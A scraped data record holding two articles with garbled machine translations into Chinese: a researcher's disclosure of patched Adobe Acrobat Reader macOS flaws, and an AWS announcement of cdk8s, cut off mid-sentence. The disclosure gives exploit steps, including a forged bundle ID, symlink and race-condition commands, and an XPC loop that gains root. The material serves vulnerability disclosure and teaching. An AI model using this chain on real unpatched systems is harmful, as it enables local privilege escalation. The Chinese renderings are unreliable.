Helper.app中找到了可爱的下载URL。下载并解压缩归档文件，最后，我找到了我正在寻找的ARMDCHammer。\n$CoDesign--Verbose--Verify-R=&#34；标识符ARMDCHammer和锚定受信任和锚定苹果通用和证书叶[subject.CN]=\\&#34；开发者ID应用程序：Adobe Systems，Inc.。(JQ525L2MZD)\\&#34；&#34；~/Downloads/ARMDCContents2/ASSET/Contents/MacOS/ARMDCHammer/Users/rekken/Downloads/ARMDCContents2/ASSET/Contents/MacOS/ARMDCHammer：在磁盘/Users/rekken/Downloads/ARMDCContents2/ASSET/Contents/MacOS/ARMDCHammer：上有效满足其指定要求/Users/rekken/Downloads/ARMDCContents2/ASSET/Contents/MacOS/ARMDCHammer：显式要求得到满足\nvalidateBinary和LaunchARMHammer之间的时间窗口较窄。OPLock可以帮助我们在Windows中冻结时间，不幸的是，在MacOS中没有这样的选择。\n步骤1：将/tmp/test/ARMDCHammer移至/tmp/test/hello_root，步骤2：休眠步骤3：将/tmp/test/hello_root移至/tmp/test/ARMDCHammer步骤4：休眠并转至步骤1。\n步骤1：创建/tmp/test/orig_download目录，创建symlink/tmp/test/orig_download/ARMDCHammer指向/tmp/test/hello_root步骤2：将/tmp/test/orig_download复制到/tmp/test/download步骤3：休眠步骤4：当/tmp/test/download消失时转至步骤2。\nWHILE(1){NSXPCConnection*ConnectionToService=[[NSXPCConnection Alalloc]initWithMachServiceName：@&#34；com.adobe.ARMDC.SMJobBlessHelper&#34；选项：0]；ConnectionToService.remoteObjectInterface=[NSXPCInterface interfaceWithProtocol：@protocol(SMJobBlessHelperProtocol)]；[ConnectionToService Resume]；id Remote=[ConnectionToService remoteObjectProxyWithErrorHandler：^(NSError*proxyError){NSLog(@&#34；Error：%@&#34；，proxyError)；}。\n我们需要线程1的原因很明显，为什么我们需要单独的线程2和线程3？\n使服务器繁忙的高频NSXPC接口调用请求会增加成功的概率。在多线程运行的情况下，争用条件需要非常短的时间。在我的测试中，大多数测试用例只需要1~3秒，而最好的用例只需要转瞬即逝的时间。\n漏洞补丁最重要的部分是添加了一个名为-[SMJobBless Helper validatePath]的新函数，在validateBinary和启动之前，它会检查路径是否为符号链接。它打破了唯一必须通过的道路。\nbool-[SMJobBless Helper验证路径](路径){if(fileIsSymbolicLink(Path)){Return False；}Return True}DoWorkAndLauchHammer(){Move(&#34；./Download&34；，&#34；/var/Folders/ZZ/xxxxx/T/Download&#34；)；if(validatePaths(&#34；/var/folders/zz/xxxxx/T/download&#34；)){if(validateBinary(&#34；/var/folders/zz/xxxxx/T/download&#34；)){launch(&#34；/var/folders/zz/xxxxx/T/download&#34；)；}\n在这篇博客中，我分析了Adobe Acrobat Reader中的三个逻辑漏洞，并展示了如何利用它们在没有沙箱限制的情况下获得根。作为几乎每个设备都需要的软件，它的安全性对MacOS至关重要。", "note_en": "Today, Adobe Acrobat Reader DC for macOS patched three critical vulnerabilities(CVE-2020-9615, CVE-2020-9614, CVE-2020-9613) I reported. The only requirement needed to trigger the vulnerabilities is that Adobe Acrobat Reader DC has been installed. A normal user on macOS(with SIP enabled) can locally exploit this vulnerabilities chain to elevate privilege to the ROOT without a user being aware. In this blog, I will analyze the details of vulnerabilities and show how to exploit them.\n  The root process has superpowers, it almost can do anything, reading/writing all sensitive files/databases such as Images/Calendars. However in modern macOS, root processes outside of sandbox are rare, most macOS built-in services run within a sandbox. They are no longer the king, they imprison themselves in a cage based on declarative sandbox profile rules.\n Good news, popular software with high privileged services are new good target in addition to macOS built-in services, so Adobe Acrobat Reader DC catch my attention.\n   com.adobe.ARMDC.SMJobBlessHelper within /Library/PrivilegedHelperTools/ is one of the components of Adobe Acrobat Reader DC, responsible for software updating. It runs as root and no-sandbox are applied, and hosts an XPC service named SMJobBlessHelper(com.adobe.ARMDC.SMJobBlessHelper). Most XPC services will check its connection client before doing any actual work, so does SMJobBlessHelper.\n  SMJobBlessHelper is based on NSXPC, its client checking exists in [SMJobBlessHelper listener:shouldAcceptNewConnection:]. The checking logic is as pseudo-code shows below, gets the client’s PID, and then obtains Bundle ID based on the client’s process path, the client will be trusted if its Bundle ID is “com.adobe.ARMDC”.\n pid = [NSXPCConnection processIdentifier];  proc_pidpath(v7, proc_path, 0x1000u);  bundle = [NSBundle bundleWithPath:proc_path];  bd_id = [bundle bundleIdentifier];    if (bd_id == &#34;com.adobe.ARMDC&#34;){   // Accept client&#39;s XPC connection request  }\n  Apple says it is “A representation of the code and resources stored in a bundle directory on disk.”, so it’s just a directory structure with some well-defined subdirectories/files. The bundle ID is obtained from Contents/Info.plist of the directory structure.\n The directory structure is certainly not credible, we can forge any Bundle ID by creating our special bundle directory.\n  As the pseudo below show, in the updating process before SMJobBlessHelper launch ARMDCHammer, download folder(in bundle’s parent directory) will be moved to /var/folders/zz/xxxxx/T/. Unfortunately after directory moving, the owner of “/var/folders/zz/xxxxx_n0000000000000/T/download” is the root, and normal user DO NOT have access to it. So it means that we can not change it and its subfiles any more.\n   If ./download/ARMDCHammer is a symlink, after being moved to /var/folders/zz/xxxxx/T/download, does the symlink still be valid?\n Yes, the symlink is still valid, it can help us to bypass temp directory protection. I can force /var/folders/zz/xxxxx/T/download/ARMDCHammer to link to anywhere.\n     validateBinary and launchARMHammer all use program path, and we have writing permission to this path.\n So if we can replace the “/tmp/test/hello_root” with our malicious file after validateBinary, launchARMHammer will launch our malicious process.\n You may think the race condition window is too narrow to control, I will show the tricks later.\n   As explained before, NSBundle is not trusted, so we try to forge an NSBundle, with its bundle id is “com.adobe.ARMDC”. For saving time, we copy Adobe’s original bundle from “/Library/Application Support/Adobe/ARMDC/Application/Adobe Acrobat Updater.app”.\n   cd /tmp/ test/exploit   echo  &#34;compiling SMJobBlessHelper-Exploit&#34;  clang -framework Foundation SMJobBlessHelper-Exploit.m -o SMJobBlessHelper-Exploit     echo  &#34;move SMJobBlessHelper-Exploit to Adobe Acrobat Updater.app&#34;  mkdir  &#34;Adobe Acrobat Updater.app/Contents/MacOS&#34;  mv SMJobBlessHelper-Exploit  &#34;Adobe Acrobat Updater.app/Contents/MacOS/&#34;\n Now, SMJobBlessHelper-Exploit, being launched as an NSXPC client, will pass through [SMJobBlessHelper listener:shouldAcceptNewConnection:]’s check.\n   Symlink can help us, before SMJobBlessHelper moves our download directory, we create a symlink at our download directory.\n $  cd /tmp/ test  $ mkdir download  $ ln -s /tmp/ test/hello_root ./download/ARMDCHammer  $ ls -l download/  total 0  lrwxr-xr-x 1 rekken staff 72 4 12 16:04 ARMDCHammer -&gt; /tmp/ test/hello_root\n   $ sudo ls -l /var/folders/zz/xxxxx/T/download  total 0  lrwxr-xr-x 1 rekken staff 72 4 12 16:04 ARMDCHammer -&gt; /tmp/ test/hello_root\n       (lldb) po  $rcx  (    &#34;--verify&#34;,    &#34;-R=identifier ARMDCHammer and anchor trusted and anchor apple generic and certificate leaf[subject.CN] = \\&#34;Developer ID Application: Adobe Systems, Inc. (JQ525L2MZD)\\&#34;&#34;,    &#34;/var/folders/zz/zyxvpxvq6csfxvn_n0000000000000/T/download/ARMDCHammer&#34;  )\n  I write a script, which searches the full local disk for ARMDCHammer, and finally gain nothing. But it must exist, isn’t it?\n Since it is not on the local drive, it should have been downloaded on demand. I reverse a lot of binary files and found the cute download URL in Acrobat Update Helper.app. Downloading and extracting the archive, in the end, I catch the ARMDCHammer I’m looking for.\n   $ codesign --verbose --verify -R= &#34;identifier ARMDCHammer and anchor trusted and anchor apple generic and certificate leaf[subject.CN] = \\&#34;Developer ID Application: Adobe Systems, Inc. (JQ525L2MZD)\\&#34;&#34; ~/Downloads/ARMDCContents2/ASSET/Contents/MacOS/ARMDCHammer    /Users/rekken/Downloads/ARMDCContents2/ASSET/Contents/MacOS/ARMDCHammer: valid on disk  /Users/rekken/Downloads/ARMDCContents2/ASSET/Contents/MacOS/ARMDCHammer: satisfies its Designated Requirement  /Users/rekken/Downloads/ARMDCContents2/ASSET/Contents/MacOS/ARMDCHammer: explicit requirement satisfied\n  The time window between validateBinary and launchARMHammer is narrow. OPLock can help us to freeze time in Windows, unfortunately, there are no alternatives like that in macOS.\n     Step 1: move /tmp/test/ARMDCHammer to /tmp/test/hello_root，  Step 2: sleep  Step 3: move /tmp/test/hello_root to /tmp/test/ARMDCHammer  Step 4: sleep and goto Step 1\n  Step 1: create /tmp/test/orig_download directory, create symlink /tmp/test/orig_download/ARMDCHammer pointing to /tmp/test/hello_root    Step 2: copy /tmp/test/orig_download to /tmp/test/download    Step 3: sleep    Step 4: goto Step 2 when /tmp/test/download disapears\n  while(1){   NSXPCConnection * connectionToService = [[NSXPCConnection alloc] initWithMachServiceName:@&#34;com.adobe.ARMDC.SMJobBlessHelper&#34; options: 0];   connectionToService.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SMJobBlessHelperProtocol)];   [connectionToService resume];     id remote = [connectionToService remoteObjectProxyWithErrorHandler:^(NSError *proxyError) {   NSLog(@&#34;error: %@&#34;, proxyError);   }];   [remote DoWorkAndLauchHammer: ^(_Bool retcode) {   //   }];  }\n The reason we need Thread 1 is obvious, why we need separate Thread 2 and Thread 3?\n High-frequency NSXPC interface call requests which make the server busy can increase the probability of success. With multi-threads running, the race condition needs a very short time. In my test, most test cases need only 1~3 seconds, and the best case only takes a blink of time.\n    The most important part of the vulnerability patch is adding a new function named -[SMJobBlessHelper validatePaths], before validateBinary and launch, it checks the path is a symlink or not. It breaks the only way which must be passed.\n bool -[SMJobBlessHelper validatePaths](path){   if(fileIsSymbolicLink(path)){   return false;   }   return true  }      DoWorkAndLauchHammer(){   move(&#34;./download&#34;, &#34;/var/folders/zz/xxxxx/T/download&#34;);     if(validatePaths(&#34;/var/folders/zz/xxxxx/T/download&#34;)){   if (validateBinary(&#34;/var/folders/zz/xxxxx/T/download&#34;)){   launch(&#34;/var/folders/zz/xxxxx/T/download&#34;);   }   }  }\n  In this blog, I analyzed the three logic vulnerabilities in Adobe Acrobat Reader and show how to exploit them to gain root without sandbox limitation. As an almost per-device required software, its security matters to macOS.", "posttime": "2020-05-15 00:05:40", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "漏洞,adobe,acrobat,flaws", "title": "Adobe Acrobat Reader中的安全漏洞允许以静默方式在MacOS上获得根", "title_en": "Security Flaws in Adobe Acrobat Reader Allow Gaining Root on macOS Silently", "transed": 1, "url": "https://rekken.github.io/2020/05/14/Security-Flaws-in-Adobe-Acrobat-Reader-Allow-Malicious-Program-to-Gain-Root-on-macOS-Silently/", "via": "", "real_tags": ["漏洞", "adobe", "acrobat", "flaws"]}, {"category": "", "categoryclass": "", "imagename": "d4e2815d580a6d47632a65c510949135.png", "infoid": 1002106, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "在AWS，我们看到客户迅速采用Kubernetes在全球部署应用程序，大规模训练机器学习模型，并标准化其跨数据中心和云交付创新的方式。使用Kubernetes，客户正在构建自动化工具以取代手动流程，为其基础设施的每一部分实施操作管道，并使开发团队能够获得对其应用程序如何运行的精细控制。\n传统上，Kubernetes应用程序是用开发人员编写和维护的人类可读的静态YAML数据文件定义的。构建新的应用程序需要编写大量的样板配置，从其他项目复制代码，并应用手动调整和自定义。随着应用程序的发展和团队的壮大，这些YAML文件变得更难管理。共享最佳实践或进行更新涉及手动更改和复杂的迁移。\nYAML是描述集群所需状态的优秀格式，但它没有用于表达逻辑和可重用抽象的原语。Kubernetes生态系统中有多种工具(kustomize、jsonnet、jkcfg、kubecfg、kubeen和Pulumi等)试图以各种方式弥补这些差距。\n我们意识到这与我们的客户在通过CloudForformationTemplates定义其应用程序时所面临的问题完全相同，该问题已由AWS CDK解决，我们可以应用AWS CDK中的相同设计概念来帮助所有Kubernetes用户。\n2018年，我们推出了AWS云开发工具包(AWS CDK)来帮助出于许多相同原因想要替代YAML的AWS CloudForment客户。AWS CDK是一个开源框架，用于使用熟悉的编程语言(如TypeScript、Python、Java和.NET)定义云基础架构。客户喜欢AWS CDK使他们能够使用现有工具和工作流编写和调配其基础架构，从而简化开发流程。他们还喜欢AWS CDK的可组合性，这使他们可以轻松抽象出配置和样板细节。我们的许多客户问我们，是否有可能将同样的概念和技术应用到库伯内斯空间。\n今天，我想告诉您有关Kubernetes的CDK，或cdk8s，这是一个新的开源项目，允许您使用熟悉的编程语言定义Kubernetes应用程序和可重用组件。cdk8s(发音为“cd Kates”)允许您使用TypeScript或Python等编程语言来生成标准的Kubernetes YAML-这意味着您可以使用它来定义在任何地方运行的任何Kubernetes集群的应用程序，包括内部部署和云环境。\ncdk8S允许您将核心Kubernetes API对象和自定义资源(CRD)作为称为“构造”的强类型类导入。这意味着您可以利用面向对象编程的所有强大原语来定义Kubernetes应用程序。最强大的功能之一是编写您自己的抽象的能力。\n使用cdk8，您可以将常见的Kubernetes模式发布为代码库，然后在任何应用程序中引用这些库。这简化了为所有Kubernetes用户定义和维护应用程序，并构建在Kubernetes声明性API方法之上，同时从根本上尊重其功能和灵活性。这还意味着您可以使用您熟悉的语言、IDE、工具和技术来编写Kubernetes应用程序。\n适用于任何群集cdk8与环境无关。它在您的机器上本地运行，并生成标准的Kubernetes YAML数据，因此您可以在任何地方运行的任何Kubernetes集群上使用它，包括内部部署和云。\n声明性状态的命令性方法cdk8s代码是使用命令性语言编写的，但最终会将所需的状态输出为纯Kubernetes YAML。这意味着您可以享受命令式编程的表现力和简单性，而不会影响声明性期望状态方法的健壮性。\n使用任何Kubernetes API版本和自定义资源cdk8包括一个漂亮的CLI工具，它允许您将任何版本的Kubernetes API导入到您的项目中，并在需要时进行更新以利用新的API版本。您还可以导入自定义资源定义。\n语言支持cdk8允许您使用TypeScript、JavaScript和Python定义应用程序。计划支持更多语言，包括围棋。\n开源的cdk8s是开源的，我们欢迎社区的贡献。我们为整个Kubernetes社区构建了cdk8，而不仅仅是AWS客户。\n让我们看看如何使用cdk8定义一个简单的Kubernetes应用程序。\nConst Labels={app：&#39；Guestbook&#39；，tier：&#39；前端&39；}；new k8s.Service(this，&#39；service&#39；，{Metadata：{labels}，spec：{type：&#39；LoadBalancer&#39；，ports：[{port：80}]，selector：labels，}})；new k8s.Deployment(this，&#39；ployment&#39；，{规范：{选择器：{matchLabels：Labels}，副本：3，模板：{Metadata：{Labels}，规范：{Containers：[{Name：&#39；php-redis&#39；，图片：&#39；gcr.io/google-samples/gb-frontend:v4&#39；，端口：[{ContainerPort：80}]，资源：{请求：{cpu：&#39；100m&#39；，内存：&#39；100-#39；}]})；\n这是Kubernetes留言簿前端的定义，合成后产生一个熟悉的YAML输出，我可以将其应用于我的集群：\napiVersion：v1种类：服务元数据：标签：应用程序：Guestbook层：前端名称：Guestbook-service-23e79b52规范：端口：-port：80选择器：App：Guestbook层：前端类型：负载均衡器-apiVersion：App/v1种类：部署元数据：名称：Guestbook-Deployment-8b2b7b76规范：副本：3选择器：Matchels：App：Guestbook层：前端模板。-redis端口：-tainerPort：80资源：请求：CPU：100M内存：100mi。\ncdk8s包含所有KubernetesAPI的类型化类。这意味着当我编写它时，我可以从我心爱的IDE获得所有帮助，其中包括代码完成、类型安全(用于静态语言)、内联文档、重构工具以及所有Jazz：\n那么如何将其部署到我的集群中呢？当执行cdk8s应用程序时，它会合成标准的Kubernetes YAML，用于将该YAML部署到集群的工作流和工具保持不变。\n$cdk8s synth-o dist&amp；&amp；kubectl application-f dist/*dist/guestbook.k8s.yaml service/guestbook-service-23e79b52已创建部署。apps/guestbook-ployment-8b2b7b76已创建。\n这也意味着cdk8s应用程序可以灵活地集成到任何标准的GitOps工作流程中。将cdk8与GitOps结合使用意味着您可以使用与构建应用程序相同的工作流来定义应用程序(用代码编写，使用CICD部署)。请查看Max Brenner关于将cdk8与Flux以及Argo CD集成的帖子。\nCDK应用程序的构建块被称为“构建”(还记得矩阵吗？)。构造可以代表任何东西：从单个的Kubernetes资源(如Pods)到复杂的概念(如微服务或成熟的MongoDB集群)。它们甚至可以代表完整的系统来为您的整个集群建模。\ncdk8可以为所有核心Kubernetes API对象(如Deployment、Service、ReplicaSet、Pod)自动生成(“导入”)构造，也可以从任何自定义资源定义生成(“导入”)构造。我们还计划增加对从Helm图表导入结构的支持。\n导入后，我们可以使用这些构造来定义图表。图表表示单个Kubernetes YAML清单。一个App由属于同一项目的多个图表组成。\n在下面的示例中，我声明了一个具有单个Kubernetes pod的图表类型HelloChart。\n类HelloChart扩展了Chart{构造函数(Scope：Construct，Name：String){Super(Scope，Name)；new k8s.Pod(this，&#39；hello&#39；，{spec：{Containers：[{name：&#39；hello&#39；，image：&#39；world&#39；}]}})；}}。\nconst app=new App()；new HelloChart(app，#39；hello&39；)；//合成应用程序中的所有图表(清单)。app.synth()；\n接口HelloChartOpts{pods：number；}类HelloChart扩展Chart{构造函数(Scope：Construct，Name：String，Opts：HelloChartOpts){Super(Scope，Name)；for(let i=0；i&lt；opts.pods；++i){new k8s.Pod(this，&#39；hello&#39；+i，{spec：{Containers：[{name：&#39；hello&#39；，image：&。}}}。\n常量APP=new App()；new HelloChart(app，#39；hello-dev&39；，{pods：1})；new HelloChart(app，#39；hello-prod&39；，{pod：10000})；app.synth()；\n这个应用程序将输出两个文件：hello-dev.k8s.yaml和hello-prod.k8s.yaml(我自己的小DOS应用程序)。基本上，一行cdk8会生成一个超过50K行的YAML。\n关于构造的酷之处在于，将它们组合成更高级别的抽象是很简单的。\n例如，在K8中，部署前面有一个服务是很常见的，所以我可以用一个称为“ServiceDeployment”的新构造类型来表示：\n类WebService扩展了构造{Construction tor(Scope：Construct，Name：String，opts：ServiceDeploymentOpts){Super(Scope，Name)；new k8s.Deployment(this，.)；new k8s.Service(this，.)；}。\n这些组合也称为抽象层。这些层可以堆叠在一起：cdk8s应用程序的底层通常由从K8SAPI或CRD生成的导入构造组成，然后将这些构造组合成更高级别的抽象。更高层可以抽象API的复杂性(例如，通过提供智能缺省值)，或者它们可以表示自以为是的想法，将主要细节抽象出来，以支持更简单的心理模型。\n现在我已经编写了抽象，我可以通过包管理器(如NPM、PyPI、Maven Central、NuGet或任何内部包管理器)与任何人共享它们，就像任何其他类库一样。这使得使用cdk8在整个公司或与社区共享最佳实践变得很容易。\n构造在我的代码中表示为面向对象的类。这意味着我可以使用面向对象设计的所有功能为我的构造创建漂亮而丰富的API。\nconst book=new k8s.Service(this，#39；book-Collection&#39；，.)；const book=new k8s.Service(this，#39；book&39；，.)；const OAuth=new大使.Oauth2Filter(this，#39；auth&39；，{AuthizationUrl：&#39；url&39；，//.})；const API=new ambasador.Api(。api.get(&#39；/book&#39；，book)；api.get(&#39；/book/.*/&#39；，book，{prefix Regex：true})；api.post(&#39；/book&#39；，book，{filter：OAuth})；api.put(&#39；/book/.*/&#39；，book，{filter：OAuth，prefix regex：true})；\n在这个模型中，ambasador.Api构造公开了一组方法，这些方法允许用户通过友好的强类型语法描述他们的路由映射和配置。\n这是cdk8的第一天。我们正在探索设计一个涵盖核心KubernetesAPI的丰富的高级构造库的意义。我们的想法是通过一个很棒的类库公开Kubernetes的全部功能集。\n要了解这可能是什么样子，请考虑Kubernetes中的常见模式，在该模式中，您可以使用ConfigMap来存储某些配置的内容，并通过卷将其提供给Pod。\n通过以下YAML：apiVersion：v1 Kind：Pod Metadata：Name：dapi-test-pod spec：Containers：-name：test-tainer image：k8s.gcr.io/busybox命令定义Pod：[&#34；/bin/sh&#34；，&#34；-c&#34；，&#34；ls/etc/config/&#34；]volumemount：-name：config-volume mount tPath：/etc/confit。\n//使用本地目录const config=ConfigMap.fromDirectory(this，./config&#39；)中的所有文件定义配置映射；//定义pod const pod=new Pod(this，&#39；dapi-test-pod&#39；)；//将配置映射添加为卷const volume=pod.addConfigMapVolume(Config)；//向pod添加容器并挂载文件//)；tainer.image=&#39；k8s.gcr.io/busybox&#39；；tainer.mount(volume，&#39；/etc/config&#39；)；//&lt；--nices！tainer.command=[&#34；/bin/sh&#34；，&#34；-c&#34；，&#34；ls/etc/config/&#34；]；tainer.restartPolicy=PodRestartPolicy.NEVER；\n我希望这能让您感受到这种高级API的潜力。您可以在GitHub上的研究部分找到关于高级设计项目的更多详细信息。\n今天我们宣布cdk8s处于“alpha”阶段。这意味着我们认为人们可以开始在他们的环境中玩耍了，并与我们合作使这个项目适用于他们的用例。\n这也意味着，我们预计cdk8在未来几个月将继续大幅变化，直到我们感觉到它是稳定的。我们将在每个版本中发布一个ChangeLog，其中包含有关中断更改和新功能的信息。\ncdk8s是一个开源项目，为整个Kubernetes社区构建。它是在https://github.com/awslabs/cdk8s上完全开发的，我们鼓励和庆祝所有的合作和贡献。\n我们很乐意听取您的意见，并欢迎您就API、开发人员体验、与其他工具、文档或功能的集成发表意见。\n以下是我们一直在探索的几个方向，以及他们的GitHub问题链接，因此您可以+1参与讨论：\n增加对新语言的支持：Java、.NET和Go都在我们的雷达上。请让我们知道您还想看到哪些其他语言。\n将构造发布为由通用“CDK合成器操作符”支持的自定义资源。\n我们对这个项目感到难以置信的兴奋，并坚信它可以让使用Kubernetes的开发人员的生活变得令人难以置信地富有成效和乐趣。\n要开始，请访问cdk8s.io。体验cdk8的最好方法是通过一个入门指南(无论是用文字脚本还是用Python)拿起它旋转一下。这些快速的小教程将引导您完成安装cdk8、使用k8sAPI甚至创作您自己的自定义构造的第一步。", "note_en": "At AWS, we’ve seen customers rapidly adopt Kubernetes to deploy applications globally, train machine learning models at scale, and standardize how they deliver innovation across data centers and the cloud. Using Kubernetes, customers are building automated tooling to replace manual processes, implementing operational pipelines for every piece of their infrastructure, and empowering development teams with the ability to get granular control over how their applications run.\n  Traditionally, Kubernetes applications are defined with human-readable, static YAML data files which developers write and maintain. Building new applications requires writing a good amount of boilerplate config, copying code from other projects, and applying manual tweaks and customizations. As applications evolve and teams grow, these YAML files become harder to manage. Sharing best practices or making updates involves manual changes and complex migrations.\n  YAML is an excellent format for describing the desired state of your cluster, but it is does not have primitives for expressing logic and reusable abstractions. There are  multiple tools in the Kubernetes ecosystem ( kustomize,  jsonnet,  jkcfg,  kubecfg,  kubegen, and  Pulumi to name a few) which attempt to address these gaps in various ways.\n  We realized this was exactly the same problem our customers had faced when defining their applications through CloudFormation templates, a problem solved by the AWS CDK, and that we could apply the same design concepts from the AWS CDK to help all Kubernetes users.\n  In 2018 we introduced the  AWS Cloud Development Kit (AWS CDK) to help AWS CloudFormation customers who wanted an alternative to YAML for many of the same reasons. The AWS CDK is an open-source framework for defining cloud infrastructure using familiar programming languages such as TypeScript, Python, Java, and .NET. Customers love how AWS CDK simplifies the development process by enabling them to use their existing tooling and workflows to write and provision their infrastructure. They also love that AWS CDK is composable, making it easy for them to abstract away configuration and boilerplate details. Many of our customers have asked us if it would be possible to apply the same concepts and technologies to the Kubernetes space.\n    Today I’d like to tell you about the  CDK for Kubernetes, or cdk8s, a new  open-source project that lets you define Kubernetes applications and reusable components using familiar programming languages. cdk8s (pronounced “ cd kates“) lets you use programming languages like TypeScript or Python to generate standard Kubernetes YAML – which means that you can use it to define applications for any Kubernetes cluster running anywhere, both on-premises and the cloud.\n  cdk8s lets you import both core Kubernetes API objects and  Custom Resources (CRDs) as strongly typed classes called “ constructs“. This means that you can leverage all the powerful primitives of object-oriented programming to define Kubernetes applications. One of the most powerful capabilities is the ability to compose your own abstractions.\n  Using cdk8s you can publish common Kubernetes patterns as code libraries, then reference these libraries in any application. This simplifies defining and maintaining applications for all Kubernetes users and builds on top of the Kubernetes declarative API approach while fundamentally respecting its capabilities and flexibility. It also means that you can author Kubernetes applications using the languages, IDEs, tools, and techniques you are familiar with.\n    Works for any cluster cdk8s is environment agnostic. It runs locally on your machine and generates standard Kubernetes YAML data, so you can use it with any Kubernetes cluster running anywhere, including on-premises and the cloud\n  Imperative approach to declarative state cdk8s code is written using imperative languages but eventually outputs your desired state as pure Kubernetes YAML. This means you can enjoy the expressiveness and simplicity of imperative programming without compromising on the robustness of the declarative desired state approach.\n  Use any Kubernetes API version and custom resources cdk8s includes a nifty CLI tool that lets you import any version of the Kubernetes API to your project, and update to take advantage of new API versions when you wish. You can also import custom resource definitions.\n  Language support cdk8s lets you define applications using TypeScript, JavaScript, and Python. Support for more languages, including Go is planned.\n  Open source cdk8s is open source and we welcome community contributions. We built cdk8s for the entire Kubernetes community, not just AWS customers.\n    Let’s take a look at how to define a simple Kubernetes app with cdk8s.\n  const labels = { app: &#39;guestbook&#39;, tier: &#39;frontend&#39; };\r\rnew k8s.Service(this, &#39;service&#39;, {\r metadata: { labels },\r spec: {\r type: &#39;LoadBalancer&#39;,\r ports: [ { port: 80 } ],\r selector: labels,\r }\r});\r\rnew k8s.Deployment(this, &#39;deployment&#39;, {\r spec: {\r selector: { matchLabels: labels },\r replicas: 3,\r template: {\r metadata: { labels },\r spec: {\r containers: [\r {\r name: &#39;php-redis&#39;,\r image: &#39;gcr.io/google-samples/gb-frontend:v4&#39;,\r ports: [{ containerPort: 80 }],\r resources: { requests: { cpu: &#39;100m&#39;, memory: &#39;100Mi&#39; } }\r }\r ]\r }\r }\r }\r});\n  This is the definition of the  Kubernetes guestbook frontend, synthesizing this produces a familiar YAML output that I can apply to my cluster:\n  apiVersion: v1\rkind: Service\rmetadata:\r labels:\r app: guestbook\r tier: frontend\r name: guestbook-service-23e79b52\rspec:\r ports:\r - port: 80\r selector:\r app: guestbook\r tier: frontend\r type: LoadBalancer\r---\rapiVersion: apps/v1\rkind: Deployment\rmetadata:\r name: guestbook-deployment-8b2b7b76\rspec:\r replicas: 3\r selector:\r matchLabels:\r app: guestbook\r tier: frontend\r template:\r metadata:\r labels:\r app: guestbook\r tier: frontend\r spec:\r containers:\r - image: gcr.io/google-samples/gb-frontend:v4\r name: php-redis\r ports:\r - containerPort: 80\r resources:\r requests:\r cpu: 100m\r memory: 100Mi\n    cdk8s includes typed classes for all the Kubernetes APIs. This means that when I write it, I can get all the help from my beloved IDE, which includes code completion, type-safety (for static languages), inline documentation, refactoring tools, and all that jazz:\n      So how does this get deployed into my cluster? When a cdk8s app is executed it synthesizes standard Kubernetes YAML, the workflow and tools you use to deploy this YAML to your cluster remain the same.\n  $ cdk8s synth -o dist &amp;&amp; kubectl apply -f dist/*\rdist/guestbook.k8s.yaml\rservice/guestbook-service-23e79b52 created\rdeployment.apps/guestbook-deployment-8b2b7b76 created\n  This also means that cdk8s apps can neatly be integrated into any standard GitOps workflow. Using cdk8s with GitOps means you can have the same workflow for defining your application (write in code, deploy with CICD) as you do for building it. Check out these posts by Max Brenner’s about Integrating cdk8s with  Flux and also with  Argo CD.\n    The building blocks of CDK apps are called “ constructs” (remember  The Matrix?). Constructs can represent anything: from individual Kubernetes resources such as Pods, to complex ideas such as Microservices or a fully-fledged MongoDB cluster. They could even represent complete systems to model your entire cluster.\n  cdk8s can automatically generate (“import”) constructs for all the core Kubernetes API objects (such as Deployment, Service, ReplicaSet, Pod) and also from any Custom Resource Definition. We are also planning to add support for importing constructs from Helm charts.\n  Once imported, we can use these constructs to define Charts. A  Chart represents a single Kubernetes YAML manifest. An  App is composed of multiple charts that are part of the same project.\n  In the following example, I’ve declared a chart type  HelloChart with a single Kubernetes pod.\n  class HelloChart extends Chart {\r constructor(scope: Construct, name: string) {\r super(scope, name);\r\r new k8s.Pod(this, &#39;hello&#39;, {\r spec: {\r containers: [ { name: &#39;hello&#39;, image: &#39;world&#39; } ]\r }\r });\r }\r}\n    const app = new App();\rnew HelloChart(app, &#39;hello&#39;);\r\r// synthesize all charts (manifests) in the app.\rapp.synth();\n        interface HelloChartOpts {\r pods: number;\r}\r\rclass HelloChart extends Chart {\r constructor(scope: Construct, name: string, opts: HelloChartOpts) {\r super(scope, name);\r\r for (let i = 0; i &lt; opts.pods; ++i) {\r new k8s.Pod(this, &#39;hello&#39; + i, {\r spec: {\r containers: [ { name: &#39;hello&#39;, image: &#39;world&#39; } ]\r }\r });\r }\r }\r}\n    const app = new App();\rnew HelloChart(app, &#39;hello-dev&#39;, { pods: 1 });\rnew HelloChart(app, &#39;hello-prod&#39;, { pod: 10000 });\rapp.synth();\n  This app will output two files:  hello-dev.k8s.yaml with a single pod and hello-prod.k8s.yaml with 10,000 pods (my own little DoS app). Basically one-line of cdk8s generates a YAML with over 50K lines.\n    The cool thing about constructs is that it’s straightforward to compose them into higher-level abstractions.\n  For example, it’s very common in k8s to have a deployment with a service in front of it, so I can express this using a new construct type called “ServiceDeployment”:\n  class WebService extends Construct {\r constructor(scope: Construct, name: string, opts: ServiceDeploymentOpts) {\r super(scope, name);\r\r new k8s.Deployment(this, ...);\r new k8s.Service(this, ...);\r }\r }\r}\n      These compositions are also known as abstraction layers. These layers can be stacked on top of each other: the bottom layer in a cdk8s app will normally consist of imported constructs generated from the k8s API or from CRDs, who are then composed into higher level abstractions. Higher layers can abstract the complexity of the API (by providing smart defaults for example) or they can represent opinionated ideas that abstract away major details in favor of a simpler mental model.\n  Now that I authored my abstractions, I can share them with anyone through a package manager such as  npm,  PyPI,  Maven Central,  NuGet or any internal package manager, just like any other class library. This makes it easy to use cdk8s to share best practices across your company or with the community.\n    Constructs are expressed in my code as object-oriented classes. This means that I can use all the power of object-oriented design to create beautiful and rich APIs for my constructs.\n    const books = new k8s.Service(this, &#39;book-collection&#39;, ...);\rconst book = new k8s.Service(this, &#39;book&#39;, ...);\r\rconst oauth = new ambassador.Oauth2Filter(this, &#39;auth&#39;, {\r authorizationUrl: &#39;url&#39;,\r // ...\r});\r\rconst api = new ambassador.Api(this, &#39;gateway&#39;);\rapi.get(&#39;/books&#39;, books);\rapi.get(&#39;/books/.*/&#39;, book, { prefixRegex: true });\rapi.post(&#39;/books&#39;, books, { filter: oauth });\rapi.put(&#39;/books/.*/&#39;, book, { filter: oauth, prefixRegex: true });\n  In this mock up, the  ambassador.Api construct exposes a bunch of methods that 